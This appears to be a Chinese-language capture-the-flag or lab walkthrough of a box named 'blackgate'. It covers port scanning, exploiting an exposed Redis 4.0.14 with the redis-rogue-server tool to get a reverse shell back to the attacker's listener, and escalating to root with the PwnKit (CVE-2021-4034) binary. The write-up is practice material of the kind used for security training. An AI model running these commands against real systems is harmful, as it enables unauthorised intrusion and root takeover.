## 掃 port
```bash
rustscan -a <target_ip> --ulimit 5000
```
```shell
[~] Automatically increasing ulimit value to 5000.
Open 192.168.234.176:22
Open 192.168.234.176:6379
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 06:30 EDT
Initiating Ping Scan at 06:30
Scanning 192.168.234.176 [4 ports]
Completed Ping Scan at 06:30, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:30
Completed Parallel DNS resolution of 1 host. at 06:30, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 06:30
Scanning 192.168.234.176 [2 ports]
Discovered open port 6379/tcp on 192.168.234.176
Discovered open port 22/tcp on 192.168.234.176
Completed SYN Stealth Scan at 06:30, 0.10s elapsed (2 total ports)
Nmap scan report for 192.168.234.176
Host is up, received reset ttl 61 (0.075s latency).
Scanned at 2025-08-28 06:30:55 EDT for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 61
6379/tcp open  redis   syn-ack ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)

```
## 分析
可以看到這台靶機開了 22/ssh 跟 6379/redis 兩個 port。  
我的想法是我會先看看 6379 的服務。
```shell
└─$ nmap -sV -sC -T4 192.168.234.176 -p 6379 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 06:33 EDT
Nmap scan report for 192.168.234.176
Host is up (0.075s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.14

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds
```
version 4.0.14 , 有點問題  
可以去 google 看看有沒有什麼 exploit  
結果發現了 [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)  
試用看看  
```shell
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
```
```python
python redis-rogue-server.py --rhost <target_ip> --lhost <local_vpn_ip> --lport 8888
```
他就會問你要互動式的 shell 還是 rev shell  
這邊選 rev shell 然後記得要 nc local 就有 rev shell 了
用以下指令獲得穩定 shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 提權
接下來是提權的部分  
可以先用 LinPEAS 掃看看
發現有 PwnKit 可以用
```shell
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```
就用 PwnKit 看看
```shell
prudence@blackgate:/tmp$ chmod +x PwnKit
chmod +x PwnKit
prudence@blackgate:/tmp$ ./PwnKit
./PwnKit
root@blackgate:/tmp# 
```
GET ROOT !